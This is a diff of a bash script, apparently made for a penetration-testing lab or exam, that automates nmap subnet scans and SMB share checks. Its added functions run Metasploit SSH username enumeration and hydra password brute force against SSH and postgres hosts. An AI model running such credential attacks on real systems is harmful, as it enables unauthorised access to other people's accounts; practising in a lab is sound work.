@@ -1,8 +1,10 @@
 #!/bin/bash
 
-if true; then
+if false; then
 
 #prereqs
+# cd /usr/share/wordlists
+# gunzip rockyou.txt.gz
 sudo apt install nmap gobuster ipcalc
 
 
@@ -10,10 +12,11 @@ sudo apt install nmap gobuster ipcalc
 # nmap setup
 onehonderd=100
 nmapfilter="Nmap done|Starting Nmap|Stats|Ping|Timing|Not shown:|Host is up|Initiating|elapsed|Please report|Raw packets|Discovered open port|NSE|Retrying OS|Warning: OSScan results|Scanning|Read data files from|host down|Completed"
+eth1="eth1"
 
 
-
-fulliprange=$(ip -o -f inet addr show | awk '/scope global/ {print $2, $4}' | grep -v eth1 | cut -c 5-)
+## IF LOADS OF ERRER EDIT GREP OF IP HERE TO CHECK IF CORRECT ONE OR NOT
+fulliprange=$(ip -o -f inet addr show | awk '/scope global/ {print $2, $4}' | grep $eth1 | cut -c 5-)
 firstipofrange=$(ipcalc $(echo $fulliprange) -nb | grep HostMin | cut -c 12- | cut -d ' ' -f 1)
 echo ip first: $firstipofrange
 
@@ -25,15 +28,16 @@ defaultbasicfolder=$firstipofrange-$onehonderd
 rm -rf $defaultbasicfolder
 mkdir -p $defaultbasicfolder
 nmap $firstipofrange-$onehonderd | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapbasic.txt
-nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
+nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
 
+zenmap-kbx --nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn 
 ##TODO add single host scan 192.168.110.10
 
 
 ##nmap making ports visible
 currentfile=$defaultbasicfolder/basic/
 macaddresfile=$defaultbasicfolder/macaddress.lst
-iplistfile=$defaultbasicfolder/iplist.lst
+iplistfile=$defaultbasicfolder/ip.lst
 rm -f $macaddresfile
 rm -rf $currentfile
 mkdir -p $currentfile
@@ -77,10 +81,20 @@ done <$defaultbasicfolder/nmapadvanced.txt
 
 
 ## making ports files
+portfile=$defaultbasicfolder/port.lst
+rm -f $portfile
+function doportstuff() {
+    sudo touch $(echo $1 | sed 's/...$//')$2
+    echo "$2">>$portfile
+}
+
 function createPorts () {
-    cat $1 | grep " open " | cut -d "/" -f 1 | while read line ; do sudo touch $(echo $f | sed 's/...$//')$line;done
+    cat $1 | grep " open " | cut -d "/" -f 1 | while read line ; do doportstuff $f $line;done
 }
 for f in $defaultbasicfolder/*/*/all; do createPorts $f; done
+
+
+
 
 ## filterfiles
 
@@ -91,6 +105,7 @@ function filterfiles() {
 
 filterfiles ${iplistfile}
 filterfiles ${macaddresfile}
+filterfiles ${portfile}
 
 # cat ${iplistfile} | sort | uniq > ${iplistfile}.filt
 # cat ${macaddresfile} | sort | uniq > ${macaddresfile}.filt
@@ -130,10 +145,6 @@ fi
 
 
 
-fi
-defaultbasicfolder="./192.168.52.1-100"
-
-
 
 # ## fileshare
 
@@ -169,5 +180,68 @@ get filex" >> ${smbfile}/all.dbs_${p}
 }
 for f in $defaultbasicfolder/combined/*/; do checkfileshares $f; done
 
-# vragen of examen ook met pokemons gaat zijn of niet
+
+function testssh() {
+    ip=$(echo $1 | cut -d "/" -f 4)
+    enumfile="${1}ssh_enum"
+    # echo $enumfile
+    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers;set RHOSTS $ip;set USER_FILE ./lists/testuser;set CHECK_FALSE false;run;exit" -o $enumfile
+    cat $enumfile >> "${1}22"
+    rm -f $enumfile
+    
+    enumfile="${1}22"
+    # echo end---$enumfile
+    cat $enumfile | grep -E "User.*found" | cut -d "'" -f 2 | while read -r username ; do
+        hydra -l $username -P ./lists/testpasswords $ip ssh -o "${1}22hydra"
+        cat "${1}22hydra" >> $enumfile
+        rm -f "${1}22hydra"
+    done
+
+}
+
+function ifport() {
+    FILE="${1}${2}"
+    
+    if [[ -f "${FILE}" ]]; then
+        $3 $1
+    fi
+}
+
+for f in $defaultbasicfolder/combined/*/; do ifport $f 22 testssh; done
+
+
+
+fi
+defaultbasicfolder="./192.168.52.1-100"
+maybetry="./maybetry"
+echo "maybe try" > $maybetry
+
+function testfunct () {
+    echo $@
+}
+
+function ifmultiport() {
+    truth=true
+    for file in "${@:3}"; do
+        if [[ ! -f "${2}${file}" ]]; then
+            truth=false
+        fi
+    done
+    if $truth; then
+        $1 $2
+    fi
+}
+
+
+
+function testpostgres() {
+    ip=$(echo $1 | cut -d "/" -f 4)
+    echo $ip
+    hydra -L ./lists/testuser -P ./lists/testpasswords ${ip} postgres
+}
+for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; done
+
+
+
+
 
